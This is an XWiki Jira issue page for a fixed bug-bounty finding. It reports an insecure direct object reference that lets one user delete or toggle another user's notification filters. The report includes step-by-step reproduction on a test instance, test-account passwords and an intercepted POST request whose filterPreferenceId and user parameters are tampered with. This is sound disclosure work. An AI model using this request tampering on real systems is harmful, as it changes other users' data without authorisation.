

[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-20337)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoadingâ€¦[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-20337)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-20337](/browse/XWIKI-20337)

# Delete/edit the custom filters of other users

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-20337 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![](/images/icons/priorities/critical.svg "Critical - Crashes, loss of data, severe memory leak.") Critical
* **Fix Version/s:**
  [15.10.1](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.10.1 "15.10.1 "), [15.5.5](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.5.5 "15.5.5 "), [14.10.21](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.10.21 "14.10.21 ")
* **Affects Version/s:**
  13.2-rc-1
* **Component/s:**
  [Notifications](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+Notifications "Notifications ")
* **Labels:**
  + [attack\_impersonation](/issues/?jql=labels+%3D+attack_impersonation "attack_impersonation")
  + [attacker\_account](/issues/?jql=labels+%3D+attacker_account "attacker_account")
  + [intigriti](/issues/?jql=labels+%3D+intigriti "intigriti")
  + [security](/issues/?jql=labels+%3D+security "security")

* **Difficulty:**
  Unknown
* **Documentation:**
  <https://www.xwiki.org/xwiki/bin/view/SecurityAdvisoryApplication/SecurityEntries/1b8d93e2-c008-47cc-a0e9-e93603a6f362>
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

**SUBMISSION REFERENCES**

* **Submission code**: XWIKI-THQ6NW33
* **Submission URL**: <https://www.intigriti.com/auth/dashboard?redirect=/submissions/e95a7ad5-7029-4627-abf0-3e3e3ea0b4ce/XWIKI-THQ6NW33>

**RESEARCHER INFORMATION**

* **Submitter**: floerer

**SUBMISSION INFORMATION**

* **Created at**: Thu, 03 Nov 2022 07:19:07 GMT
* **Submission status**: Archived

**REPORT CONTENT**

* **Severity**: Medium (5.3)
* **Domain**: <https://intigriti.xwiki.com/> (Url)
* **Proof of concept**: It is possible to delete the custom filters of other users or turn them on or off.

  This is possible because of an IDOR.

\***Steps to reproduce**\*

1. Login on <https://intigriti.xwiki.com> with `floerer` and password `Intigriti1`

2. Now go to <https://intigriti.xwiki.com/xwiki/bin/edit/XWiki/floerer?editor=inline&category=notifications> and scroll all the way down.

3. You will see a `custom filter`

4. Now also login with a different account on <https://intigriti.xwiki.com> with `floerer1` and password `Intigriti2`

5. Also go to <https://intigriti.xwiki.com/xwiki/bin/edit/XWiki/floerer?editor=inline&category=notifications> and scroll all the way down.

6. You will see another custom filter here.

7. On this account (the second) click on `Delete` and now intercept the HTTP requests while clicking on `Yes`

8. A request like this will come by:

```

POST /xwiki/bin/get/XWiki/Notifications/Code/NotificationPreferenceService?outputSyntax=plain HTTP/1.1

Host: intigriti.xwiki.com

Cookie:

validation="d429f244b1db53bd481daafc7c876e33"

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0

Accept: **/**

Accept-Language: nl,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 108

Origin: <https://intigriti.xwiki.com>

Referer: <https://intigriti.xwiki.com/xwiki/bin/edit/XWiki/floerer?editor=inline&category=notifications&livedata-config-user.profile.group.table=EYCQ1ghgGhByDqBLApsYF3CA>

action=deleteFilterPreference&filterPreferenceId=NFP\_14&csrf=sNDu8B6axbgbixVujafDrg&target=user&user=floerer1

```

9. Change the `filterPreferenceId` value to `NFP\_11` and the `user` value to `floerer`

10. Now forward the request and reload the page of the first account, you will see the custom filter is gone.

* **Impact**: Delete or enable and disable the custom filters of other users.
* **Personal data involved**: No
* **Endpoint**: <https://intigriti.xwiki.com/xwiki/bin/get/XWiki/Notifications/Code/NotificationPreferenceService?outputSyntax=plain>
* **Type**: Insecure Direct Object Reference
* **Attachments**: No attachments available

#### Attachments

#### Issue Links

causes

![Bug - A problem which impairs or prevents the functions of the product.](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[XWIKI-21815](/browse/XWIKI-21815)
Can't follow any users - Error saving the notification setting

* ![Blocker - Blocks development and/or testing work, production could not run.](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.")
* Closed

is caused by

![Improvement - An improvement or enhancement to an existing feature or task.](/secure/viewavatar?size=xsmall&avatarId=13510&avatarType=issuetype "Improvement - An improvement or enhancement to an existing feature or task.")
[XWIKI-16158](/browse/XWIKI-16158)
Allow admin to access the notification preferences of other users

* ![Major - Major loss of function.](/images/icons/priorities/major.svg "Major - Major loss of function.")
* Closed

relates to

![Bug - A problem which impairs or prevents the functions of the product.](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[XWIKI-20336](/browse/XWIKI-20336)
Read notification filters of other users

* ![Major - Major loss of function.](/images/icons/priorities/major.svg "Major - Major loss of function.")
* Closed

#### Activity

#### People

Assignee:

![surli](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Simon Urli

Reporter:

![intigriti](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Intigriti Integration

Votes:
0
Vote for this issue

Watchers:
2
Start watching this issue

#### Dates

Created:

08/Nov/22 15:39

Updated:

10/Dec/24 17:10

Resolved:

05/Dec/23 15:08

Date of First Response:

18/Nov/22 11:02 AM

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)

